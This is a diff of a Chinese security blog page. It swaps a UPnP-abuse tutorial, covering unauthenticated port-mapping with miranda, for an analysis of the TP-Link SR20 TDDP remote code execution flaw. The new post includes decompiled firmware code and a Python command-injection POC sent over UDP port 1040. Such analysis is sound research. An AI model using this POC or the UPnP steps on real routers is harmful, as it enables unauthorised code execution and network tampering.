@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          UPnP协议利用 - hello word
+          hello word
         
     </title>
 
-    <link rel="canonical" href="http://yoursite-url/2019/06/22/UPnP协议利用/">
+    <link rel="canonical" href="http://yoursite-url/2019/11/27/TP-Link SR20 本地网络远程代码执行漏洞/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -69,7 +69,7 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('wallhaven-89081.jpg')
+            background-image: url('undefined')
             /*post*/
         
     }
@@ -90,14 +90,12 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#UPnP" title="UPnP">UPnP</a>
-                            
                         </div>
-                        <h1>UPnP协议利用</h1>
+                        <h1></h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by 骑猪满天飞 on
-                            2019-06-22
+                            2019-11-27
                         </span>
                     </div>
                 
@@ -144,13 +142,6 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
-                        </li>
-                        
-                    
-
-                        
-                        <li>
                             <a href="/archive/">Archives</a>
                         </li>
                         
@@ -159,6 +150,13 @@
                         
                         <li>
                             <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -214,85 +212,40 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1><span id="1upnp介绍">1.UPnP介绍</span></h1>
-<hr>
-<p>UPnP为即插即用的缩写（Universal Plug and Play）是一套网络协议。适用于家庭网络，用于设备间的发现和连接。希望实现任何设备只要一接入网络就能被网络中的所有其它设备发现，做到完全的即插即用。</p>
-<h1><span id="2upnp工作方式">2.UPnP工作方式</span></h1>
-<hr>
-<p><img src="working.jpg" alt="image"></p>
-<h2><span id="21寻址">2.1寻址</span></h2>
-<p>每台设备通过IP的方式进行寻址，设备首次加入网络时通过DHCP服务获取IP，或者通过静态IP设置获得IP</p>
-<h2><span id="22发现">2.2发现</span></h2>
-<p>UPnP通过SSDP（简单服务发现协议）完成设备的发现。</p>
-<p>1）当设备加入网路时它向UPnP专用的组播地址（239.255.255.250:1900）发送消息宣告自己的存在。</p>
-<pre><code>NOTIFY * HTTP/1.1  
-Host:239.255.255.250:1900  
-Cache-control:max-age=1800  
-Location:http://192.168.0.1:49152/des.xml  
-Nt:upnp:rootdevice  
-Nts:ssdp:alive  
-Usn:uuid:de5d6118-bfcb-918e-0000-00001eccef34::upnp:rootdevice  
-</code></pre>
-<p>Location：设备描述文件的URL。</p>
-<p>2）UPnP的控制点（如路由器）为发现设备将向组播发送如下消息：</p>
-<pre><code>M-SEARCH* HTTP/1.1  
-Host:239.255.255.250:1900  
-Man:&quot;ssdp:discover&quot;  
-Mx:5  
-ST:ssdp:rootdevice 
-</code></pre>
-<h2><span id="23描述">2.3描述</span></h2>
-<p>设备描述文件的URL包含在设备加入网络时发送的消息中</p>
-<pre><code> Location:http://192.168.0.1:49152/des.xml 
-</code></pre>
-<p>这个xml文件可直接通过url访问。其中包含了设备的类型，设备提供的服务。</p>
-<h2><span id="24控制">2.4控制</span></h2>
-<p>UPnP通过SOAP协议控制设备，按照XML描述文件中的信息，以Device（设备）+Service（设备的服务）+action（动作）+Variable（值）的形式控制设备。</p>
-<h1><span id="3upnp协议利用">3.UPnP协议利用</span></h1>
-<hr>
-<p>UPnP协议无任何身份验证机制，并且现在大部分路由器都默认开启了UPnP服务。大量的设备可利用UPnP进行配置修改。<br>
-通过UPnP协议在内网可以干很多事情如：端口转换，动态DNS，查看设备状态等。</p>
-<h2><span id="31upnp利用工具miranda">3.1UPnP利用工具：miranda</span></h2>
-<p>Miranda是Kali提供的一款基于Python语言的UPNP客户端工具。它可以用来发现、查询和操作UPNP设备，尤其是网关设置。</p>
-<p><img src="miranda.jpg" alt="miranda"><br>
-miranda拥有独立的命令行界面可使用Tab键补齐命令。<br>
-通过help可列出miranda的命令。<br>
-<img src="miranda_help.jpg" alt></p>
-<h2><span id="32设备发现">3.2设备发现</span></h2>
-<ul>
-<li>pcap：被动发现设备通过嗅探设备接入网络时发送的NOTIFY消息获取设备信息。</li>
-<li>msearch:通过主动发送M-serach消息来发现设备。（一般使用msearch比较快）</li>
-</ul>
-<p><img src="discover.jpg" alt="设备发现"><br>
-发现设备后可用host命令来查看详细信息。</p>
-<ul>
-<li>host list：查看发现的设备列表</li>
-<li>host get <n>：获取信息（查询summary之前需执行）</n></li>
-<li>host info <n>：显示查询到的信息</n></li>
-<li>host summary 0 ：显示xml文件的摘要信息<br>
-（n为设备在列表中的编号）</li>
-</ul>
-<p><img src="host.jpg" alt="host命令"></p>
-<h2><span id="33利用">3.3利用</span></h2>
-<p>获取设备列表<br>
-<code>host info 0 deviceList</code><br>
-获取设备支持的命令/服务信息（命令很长使用Tab键补齐很方便 ）<br>
-<code>host info 0 deviceList WANConnectionDevice services WANIPConnection actions</code><br>
-<img src="getinfo.jpg" alt="获取服务信息"></p>
-<p>已添加端口映射为例：<br>
-使用<code>host send 0 &lt;device name&gt; &lt;service name&gt; &lt;action name&gt;</code>命令对设备进行控制</p>
-<p><img src="devControl.png" alt="控制"></p>
-<p>分别填入端口映射描述、持续时间、需要做端口映射的内网计算机IP、<br>
-是否启用、外网端口、外网主机范围、协议、内网的端口</p>
-<p><img src="forword1.jpg" alt="端口转发1"></p>
-<p><img src="forword2.jpg" alt="端口转发2"></p>
-<p>打开路由器可以发现这条规则已经添加<br>
-<img src="result.jpg" alt="结果"></p>
-<h2><span id="参考文章">参考文章：</span></h2>
-<hr>
-<p><a href="https://blog.csdn.net/braddoris/article/details/41646789" target="_blank" rel="noopener">https://blog.csdn.net/braddoris/article/details/41646789</a><br>
-<a href="https://tools.kali.org/information-gathering/miranda" target="_blank" rel="noopener">https://tools.kali.org/information-gathering/miranda</a><br>
-<a href="https://dangfan.me/zh-Hans/posts/upnp-intro" target="_blank" rel="noopener">https://dangfan.me/zh-Hans/posts/upnp-intro</a></p>
+                <h1><span id="环境搭建">环境搭建</span></h1>
+<p>漏洞的介绍与环境搭建可以看SeeBug对于此漏洞的复现文章<br>
+链接：<a href="https://paper.seebug.org/879/" target="_blank" rel="noopener">重现 TP-Link SR20 本地网络远程代码执行漏洞</a></p>
+<h1><span id="tddp协议介绍介绍">TDDP协议介绍介绍</span></h1>
+<p>TDDP是TP-Link用于调试的简单协议，这个协议使用一个数据包，在载荷中使用不同的消息类型来完成请求或者命令的传递。下面的图片是TDDP的数据包信息<br>
+<img src="tddp_protocol.PNG" alt></p>
+<p>官方介绍：<br>
+<a href="https://patentimages.storage.googleapis.com/d8/ad/08/b5ae76e905594d/CN102096654A.pdf" target="_blank" rel="noopener">https://patentimages.storage.googleapis.com/d8/ad/08/b5ae76e905594d/CN102096654A.pdf</a></p>
+<h1><span id="漏洞分析">漏洞分析</span></h1>
+<p>使用IDA查看tddp程序，因为程序不是很大，可从头分析逻辑，搜索tddp启动时打印字符串tddp task start的位置，找到程序起始位置。</p>
+<p><img src="tddp_start.PNG" alt></p>
+<p>sub_16ACCh函数申请了一块内存空间，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memset(s-&gt;field_38, 0, 9u);</span><br><span class="line">memset(s-&gt;buff1, 0, 0xAFC9u);</span><br><span class="line">memset(s-&gt;recv_buff, 0, 0xAFC9u);</span><br><span class="line">memset(s-&gt;field_41, 0, 17u);</span><br><span class="line">memset(s, 0, 0x28u);</span><br></pre></td></tr></table></figure>
+<p>后续此空间用来保存socket信息和传递的数据。根据此信息创建一个结构体，来简化伪代码：<br>
+<img src="struct_info.PNG" alt><br>
+sub_16E5C函数用来创建socket</p>
+<p>tddp_type_handle函数根据接收数据包，选择tddp v1 或tddp v2进行处理（tddp v2包含认证）。跟进该函数：<br>
+<img src="tddp_handle.PNG" alt><br>
+程序根据接收的第一个字节判断tddp版本信息，跟进tddp_version1_handle函数：<br>
+<img src="tddp_version1.PNG" alt><br>
+该函数根据接收数据第二个字节选择特定debug功能。</p>
+<p>漏洞点在处理 CMD_FTEST_CONFIG 所在的 0x31 这个分支，继续跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall CMD_FTEST_CONFIG(int *data)</span><br><span class="line">&#123;</span><br><span class="line">  void *L; // r0</span><br><span class="line">  uint32_t v2; // r0</span><br><span class="line">  char *v3; // r3</span><br><span class="line">  __int16 v4; // r2</span><br><span class="line">  char *v5; // r3</span><br><span class="line">  int v6; // r0</span><br><span class="line">  int v7; // r1</span><br><span class="line">  data_info *v10; // [sp+4h] [bp-E8h]</span><br><span class="line">  char name; // [sp+8h] [bp-E4h]</span><br><span class="line">  char s; // [sp+48h] [bp-A4h]</span><br><span class="line">  char filname; // [sp+88h] [bp-64h]</span><br><span class="line">  char *v14; // [sp+C8h] [bp-24h]</span><br><span class="line">  char *v15; // [sp+CCh] [bp-20h]</span><br><span class="line">  char *v16; // [sp+D0h] [bp-1Ch]</span><br><span class="line">  int v17; // [sp+D4h] [bp-18h]</span><br><span class="line">  char *ip_addr; // [sp+D8h] [bp-14h]</span><br><span class="line">  int v19; // [sp+DCh] [bp-10h]</span><br><span class="line">  unsigned int v20; // [sp+E0h] [bp-Ch]</span><br><span class="line">  char *v21; // [sp+E4h] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = data;</span><br><span class="line">  v20 = 1;</span><br><span class="line">  v19 = 4;</span><br><span class="line">  memset(&amp;filname, 0, 0x40u);</span><br><span class="line">  memset(&amp;s, 0, 0x40u);</span><br><span class="line">  L = memset(&amp;name, 0, 0x40u);</span><br><span class="line">  ip_addr = 0;</span><br><span class="line">  v17 = luaL_newstate(L);</span><br><span class="line">  v21 = v10-&gt;recv_buff;</span><br><span class="line">  v16 = v10-&gt;buff1;</span><br><span class="line">  v15 = v10-&gt;recv_buff;</span><br><span class="line">  v14 = v10-&gt;buff1;</span><br><span class="line">  v10-&gt;buff1[1] = 0x31;</span><br><span class="line">  v2 = htonl(0);</span><br><span class="line">  v3 = v14;</span><br><span class="line">  v14[4] = v2;</span><br><span class="line">  v3[5] = BYTE1(v2);</span><br><span class="line">  v3[6] = BYTE2(v2);</span><br><span class="line">  v3[7] = HIBYTE(v2);</span><br><span class="line">  v14[2] = 2;</span><br><span class="line">  v4 = (v15[9] &lt;&lt; 8) | v15[8];</span><br><span class="line">  v5 = v14;</span><br><span class="line">  v14[8] = v15[8];</span><br><span class="line">  v5[9] = HIBYTE(v4);</span><br><span class="line">  if ( *v15 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 += 12;   //数据偏移字节</span><br><span class="line">    v16 += 12;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v21 += 28;</span><br><span class="line">    v16 += 28;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !v21 )</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  sscanf(v21, &quot;%[^;];%s&quot;, &amp;filname, &amp;s);</span><br><span class="line">  if ( !filname || !s )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;[%s():%d] luaFile or configFile len error.\n&quot;, 98236, 555);</span><br><span class="line">LABEL_20:</span><br><span class="line">    v14[3] = 3;</span><br><span class="line">    return error(-10303, 94892);</span><br><span class="line">  &#125;</span><br><span class="line">  ip_addr = inet_ntoa(v10-&gt;sin_addr);</span><br><span class="line">  exec_cmd(&quot;cd /tmp;tftp -gr %s %s &amp;&quot;, &amp;filname, ip_addr);</span><br><span class="line">  sprintf(&amp;name, &quot;/tmp/%s&quot;, &amp;filname);</span><br><span class="line">  while ( v19 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(1u);</span><br><span class="line">    if ( !access(&amp;name, 0) )                    // 判断lua文件是否下载成功</span><br><span class="line">      break;</span><br><span class="line">    --v19;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;[%s():%d] lua file [%s] don&apos;t exsit.\n&quot;, 98236, 574, &amp;name);</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    luaL_openlibs(v17);</span><br><span class="line">    if ( !luaL_loadfile(v17, &amp;name) )</span><br><span class="line">      lua_pcall(v17, 0, -1, 0);</span><br><span class="line">    lua_getfield(v17, -10002, 0x172A0);</span><br><span class="line">    lua_pushstring(v17, &amp;s);</span><br><span class="line">    lua_pushstring(v17, ip_addr);</span><br><span class="line">    lua_call(v17, 2, 1);</span><br><span class="line">    v6 = lua_tonumber(v17, -1);</span><br><span class="line">    v20 = sub_16EC4(v6, v7);</span><br><span class="line">    lua_settop(v17, -2);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_close(v17);</span><br><span class="line">  if ( v20 )</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  v14[3] = 0;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数从接收数据的第12字节，获取要下载的文件名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( *v15 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 += 12;   //数据偏移字节</span><br><span class="line">    v16 += 12;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">sscanf(v21, &quot;%[^;];%s&quot;, &amp;filname, &amp;s);</span><br></pre></td></tr></table></figure>
+<p>后拼接成命令：cd /tmp;tftp -gr %s %s ，实现了使用tftp去连接指定ip地址并下载相应的文件，并最终通过c代码调用该lua文件中的config_test函数，从而实现任意代码执行：<br>
+<img src="lua.PNG" alt></p>
+<h1><span id="命令注入漏洞">命令注入漏洞</span></h1>
+<p>根据分析，CMD_FTEST_CONFIG 函数也存在一个命令注入，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sscanf(v21, &quot;%[^;];%s&quot;, &amp;filname, &amp;s);</span><br><span class="line">...</span><br><span class="line">exec_cmd(&quot;cd /tmp;tftp -gr %s %s &amp;&quot;, &amp;filname, ip_addr);</span><br></pre></td></tr></table></figure>
+<p>其中filename为用户可控输入，可拼接造成命令注入。</p>
+<p>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">argument = &quot;|| %s&amp;&amp;ping;123 &quot; % sys.argv[2]</span><br><span class="line">payload = p8(1)+p8(0x31)+10*p8(0)+argument</span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_send.sendto(payload,(sys.argv[1],1040))</span><br></pre></td></tr></table></figure>
+<p><img src="command_inject.PNG" alt></p>
 
                 
 
@@ -300,13 +253,9 @@ miranda拥有独立的命令行界面可使用Tab键补齐命令。<br>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2019/06/24/large-bin-attack/" data-toggle="tooltip" data-placement="top" title="large bin attack">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/03/18/hexo-theme-beantech/" data-toggle="tooltip" data-placement="top" title="[Hexo] Theme BeanTech">Next Post &rarr;</a>
+                            <a href="/2019/11/27/ARM栈结构/" data-toggle="tooltip" data-placement="top" title="">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -331,17 +280,6 @@ miranda拥有独立的命令行界面可使用Tab键补齐命令。<br>
             <!-- Tabe of Content -->
             <!-- Table of Contents -->
 
-    
-      <aside id="sidebar">
-        <div id="toc" class="toc-article">
-        <strong class="toc-title">Contents</strong>
-        
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">1.UPnP介绍</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">2.UPnP工作方式</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">2.1寻址</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">2.2发现</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">2.3描述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">2.4控制</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">3.UPnP协议利用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">3.1UPnP利用工具：miranda</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">3.2设备发现</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">3.3利用</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.4.</span> <span class="toc-nav-text">参考文章：</span></a></li></ol></li></ol>
-        
-        </div>
-      </aside>
-    
-
                 
             <!-- Sidebar Container -->
             <div class="
@@ -356,8 +294,6 @@ miranda拥有独立的命令行界面可使用Tab键补齐命令。<br>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#UPnP" title="UPnP">UPnP</a>
-                        
                     </div>
                 </section>
                 
@@ -391,8 +327,8 @@ miranda拥有独立的命令行界面可使用Tab键补齐命令。<br>
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://yoursite-url/2019/06/22/UPnP协议利用/";
-    var disqus_url = "http://yoursite-url/2019/06/22/UPnP协议利用/";
+    var disqus_identifier = "http://yoursite-url/2019/11/27/TP-Link SR20 本地网络远程代码执行漏洞/";
+    var disqus_url = "http://yoursite-url/2019/11/27/TP-Link SR20 本地网络远程代码执行漏洞/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
